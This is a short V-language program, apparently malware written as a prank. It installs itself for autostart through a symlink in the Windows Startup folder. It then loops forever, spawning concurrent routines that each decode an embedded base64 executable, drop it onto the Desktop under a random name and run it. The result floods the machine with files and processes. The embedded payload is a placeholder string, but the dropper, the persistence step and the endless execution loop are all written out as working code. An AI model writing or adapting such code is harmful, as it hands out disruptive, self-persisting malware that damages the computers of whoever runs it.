import rand
import encoding.base64
import os

fn fuckitup(){
	// base64 encoded version of the compiled endless.v 
	the_bad_content := "paste_compiled_endless.exe_code_as_oneline_here"
	// the new filename should be random
	the_bad_guy := os.home_dir()+"\\Desktop\\"+rand.string(8)+".exe"
	// create, open the file and write the content above into it
	os.write_file(the_bad_guy, base64.decode_str(the_bad_content)) or {
		println("Lucky!")
		return
	}
	// execute the new created exe file
	os.system("start cmd /k \""+the_bad_guy+"\"")
}

fn make_autostart(){
	// symlink destinations
	symlink_dest := os.home_dir()+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fuckit.exe"
	target := os.getwd()+"\\tryToStopIt.exe"

	// if symlink not exists, create it
	if !exists(symlink_dest){
		os.symlink(symlink_dest, target) or{
			return
		}
	}
}

fn main(){
	
	make_autostart()
	// the funny part, make endless concurrence executions of the code above :)
	for{
		go fuckitup()
	}
}